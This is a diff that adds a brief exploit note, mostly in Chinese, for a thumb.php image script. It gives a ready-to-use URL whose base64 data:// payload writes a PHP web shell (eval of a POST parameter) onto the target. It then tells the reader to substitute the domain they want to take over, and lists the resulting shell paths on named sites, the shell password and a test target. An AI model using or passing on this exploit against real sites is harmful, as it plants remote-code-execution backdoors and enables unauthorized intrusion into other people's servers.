@@ -1,0 +1,11 @@
+EXP:  thumb.php?url=data://text/plain;base64,PD9waHAgaWYoJF9QT1NUW2NdKXtldmFsKCRfUE9TVFtjXSk7fWVsc2V7cGhwaW5mbygpO30/Pg==&w=&t=.php&r=1
+
+博客域名换你需要getshell的域名
+
+shell地址：http://Madman.in/data/thumb/44/ed/44ed1732a7e550e7a8874943fc774bad_100_100_.php
+
+shell密码：C
+
+测试网站：http://www.mop.la/1.txt
+
+shell测试：http://www.mop.la/data/thumb/44/ed/44ed1732a7e550e7a8874943fc774bad_100_100_.php
